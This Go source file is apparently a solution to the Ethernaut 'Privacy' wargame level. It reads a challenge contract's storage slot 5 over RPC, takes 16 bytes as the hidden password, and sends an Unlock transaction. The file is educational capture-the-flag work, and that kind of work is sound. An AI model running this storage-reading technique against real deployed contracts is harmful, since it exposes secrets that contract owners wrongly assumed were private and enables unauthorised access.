package main

import (
	"context"
	"crypto/ecdsa"
	"log"
	"math/big"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/rbrick/ethernaut/contracts"
)

type PrivacyPuzzle struct{}

func (*PrivacyPuzzle) Execute(rpcClient *ethclient.Client, chainId *big.Int,
	privateKey *ecdsa.PrivateKey, accountAddress common.Address) error {
	instanceAddress := common.HexToAddress("0xb3a07a71CA2723CBDef27BFFf21F9f3465Aa4761")
	keyedTransactor, err := bind.NewKeyedTransactorWithChainID(privateKey, chainId)

	if err != nil {
		return err
	}

	privacyContract, err := contracts.NewPrivacy(instanceAddress, rpcClient)

	if err != nil {
		return err
	}

	// According to the contract, the password would be stored in the 5th slot
	slotNumber := common.BigToHash(big.NewInt(int64(5)))

	password, err := rpcClient.StorageAt(context.Background(), instanceAddress, slotNumber, nil)

	if err != nil {
		return err
	}

	// take the upper 16 bytes, to convert it to a byte16 type
	bytePassword := [16]byte(password[0:16])

	// // Unlock the contract
	txn, err := privacyContract.Unlock(keyedTransactor, bytePassword)

	if err != nil {
		log.Println(err)
		return nil
	}

	bind.WaitMined(context.Background(), rpcClient, txn)
	return nil
}
